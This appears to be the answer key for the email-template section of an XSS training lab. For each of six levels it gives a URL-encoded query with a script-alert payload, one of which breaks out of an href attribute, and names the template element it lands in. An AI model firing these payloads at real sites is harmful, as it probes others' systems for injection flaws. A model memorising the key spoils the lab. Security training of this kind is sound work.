# email-template — solutions

Raw reflections inside HTML email templates (welcome, reset link, order, newsletter, alert, invoice).

### email-template-level1

`/email-template/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<h2>Welcome, ...!</h2>`

### email-template-level2

`/email-template/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<a href="https://example.com/reset?token=...">` — break attribute

### email-template-level3

`/email-template/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in product `<td>`

### email-template-level4

`/email-template/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in article `<h3>`

### email-template-level5

`/email-template/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in colored alert `<td>`

### email-template-level6

`/email-template/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in invoice description `<td>`
